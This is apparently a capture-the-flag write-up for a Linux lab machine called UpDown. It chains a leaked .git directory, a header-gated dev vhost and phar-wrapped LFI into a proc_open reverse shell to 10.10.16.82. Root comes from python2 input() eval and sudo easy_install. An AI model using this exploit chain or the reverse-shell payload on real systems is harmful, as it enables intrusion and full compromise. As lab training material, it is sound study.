---
title: UpDown
date: 2026-09-10
description: Medium Linux box combining a leaked .git directory and special-header vhost bypass with a phar-wrapped LFI payload, dodging disable_functions through proc_open, and abusing a python2 input() SUID binary.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Thu Sep 10 10:37:36 2026 as: /usr/lib/nmap/nmap -p22,80 -A -oN scan_results.txt 10.129.227.227
Nmap scan report for updown.htb (10.129.227.227)
Host is up (0.68s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   627.45 ms 10.10.16.1
2   331.61 ms updown.htb (10.129.227.227)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 10 10:38:21 2026 -- 1 IP address (1 host up) scanned in 45.60 seconds

```

On port 80 we get the domain name `siteisup.htb`

> **Note**: Only the **actual** site domain name can reveal **subdomains**

- Add it to the `/etc/hosts`
- Not vulnerable to command injection

Hidden directories:

> **Note**: Sometimes use a small wordlist 1st for directory enumeration (common.txt)

- /dev => /dev/.git

- **git-dumper** can **fetch** files from the **.git** directory

```dir-tree
git
├── admin.php
├── changelog.txt
├── checker.php
├── .git
│   ├── config
│   ├── description
│   ├── HEAD
│   ├── hooks
│   │   ├── applypatch-msg.sample
│   │   ├── commit-msg.sample
│   │   ├── fsmonitor-watchman.sample
│   │   ├── post-update.sample
│   │   ├── pre-applypatch.sample
│   │   ├── pre-commit.sample
│   │   ├── pre-merge-commit.sample
│   │   ├── pre-push.sample
│   │   ├── pre-rebase.sample
│   │   ├── pre-receive.sample
│   │   ├── push-to-checkout.sample
│   │   └── update.sample
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── logs
│   │   ├── HEAD
│   │   └── refs
│   │       ├── heads
│   │       │   └── main
│   │       └── remotes
│   │           └── origin
│   │               └── HEAD
│   ├── objects
│   │   └── pack
│   │       ├── pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx
│   │       └── pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack
│   ├── packed-refs
│   └── refs
│       ├── heads
│       │   └── main
│       └── remotes
│           └── origin
│               └── HEAD
├── .htaccess
├── index.php
└── stylesheet.css

15 directories, 32 files
```

---
> **Note**: `.htaccess` is an Apache configuration file placed in web directories to control server behavior such as URL rewriting, access control, authentication, caching, error handling, and setting **custom environment variables** for the application, without editing the main server config.
---

**.htaccess** revealed a special header:

```txt
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

A subdomain `dev.siteisup.htb` is discovered — it gives a **403 forbidden access** error:

- The **special header** found in the **.htaccess** opens it

Automate the header in Burp:
- Proxy tab -> match and replace -> add `Special-Dev: only4dev` in replace, leave the match tab empty

The subdomain runs a **beta** version of the main site — and here you can **upload files** to check them.

- Clicking the admin panel reveals a parameter called `page`
- Checking the source of `index.php`:

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<​?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

---
> **Note**: The application is vulnerable to Local File Inclusion (LFI) via the `include()` function with unsanitized `$_GET['page']` parameter, where a blacklist filter attempting to block `/etc` and `/home` directories can potentially be bypassed to achieve Remote Code Execution (RCE).
---

checker.php's source shows uploads are saved under the **uploads** directory with **md5** of the **time** as the folder name:

- Checks file size (10kb)
- then the blacklisted extensions
- saves the file in the folder

**Full code** : `checker.php`

```php
<​?php
if(DIRECTACCESS){
	die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
		</form>

<​?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}

function getExtension($file) {
	$extension = strrpos($file,".");
	return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```

It recursively checks each site mentioned in the file and deletes it after a cycle.

> Whitelisting is recommended — developers miss the few extensions which can be used to abuse

### PHAR - php filter (PHP ARCHIVE)

**PHAR** is a PHP archive format that packages PHP code/resources into a single file and can be exploited via the `phar://` stream wrapper in LFI vulnerabilities to achieve RCE.

Create a `info.php` file for testing:

```php
<​?php phpinfo(); ?>
```

Zip the php file:

```sh
zip info.zip info.php
```

Change the extension:

```sh
mv info.zip info.txt
```

Upload **info.txt**, check the **/uploads** page for the path, paste it into the **page** parameter prefixed with **phar://** and ending with the file's name to unzip it with **phar**:

```URL
http://dev.siteisup.htb/?page=phar://uploads/5b6754e77c00533547b8938f93c9a716/info.txt/info
```

phpinfo page loads:

- **Disable_functions** under the **CORE** heading
	- Important functions like `system,exec,shell_exec,popen,` are disabled

### dfunc-bypasser.py

> https://github.com/teambi0s/dfunc-bypasser/

`dfunc-bypasser.py` analyzes a phpinfo page for functions we can still abuse.

-> Copied the page source and created a html file:

```sh
python2 dfunc-bypasser.py --file phpinfo.html
```

**proc_open** can be used to execute system commands:

>Reference: https://www.php.net/manual/en/function.proc-open.php

# User

Payload:

```php
<​?php
$descriptorspec = array(
	0 => array('pipe', 'r'), //stdin
	1 => array('pipe', 'w'), //stdout
	2 => array('pipe', 'a') //stderr
);
$cmd = "bash -c '/bin/bash -i >& /dev/tcp/10.10.16.82/9001 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipe, null, null);
?>
```

- Those two nulls -> 1st null => $cwd, 2nd null => $env (check Reference)

Wrap it up:

```sh
zip payload.zip payload.php

mv payload.php payload.txt
```

Upload the payload and execute the phar URL — reverse shell on the listener:

```URL
http://dev.siteisup.htb/?page=phar://uploads/c3cfcce0858c660cde7bcd8a54baa4a5/payload.txt/payload
```

Gained shell as `www-data`

```sh
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

There's a binary with **SUID** privilege to escalate from **www-data** to **developer**.

`strings siteisup` shows it runs a `siteisup_test.py` script using the absolute path of **python**:

```python
# siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
```

The **print** function **without parentheses** means **python2** — and in **python2** the `input()` function acts as `eval()`, executing the string value:

```sh
__import__('os').system('/bin/bash')
```

- import the `os` library to execute system commands

```sh
./siteisup
__import__('os').system('/bin/bash')

id
uid=1002(developer) gid=33(www-data) groups=33(www-data) 
```

Unstable developer shell — stabilize with python3's **pty** library or ssh keys.

# Root

```sh
sudo -l 

User developer may run the following commands on localhost:
	(ALL) NOPASSWD: /usr/local/bin/easy_install
```

> Reference : https://gtfobins.org/gtfobins/easy_install/

```sh
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py

sudo easy_install .
```

Gained `root`
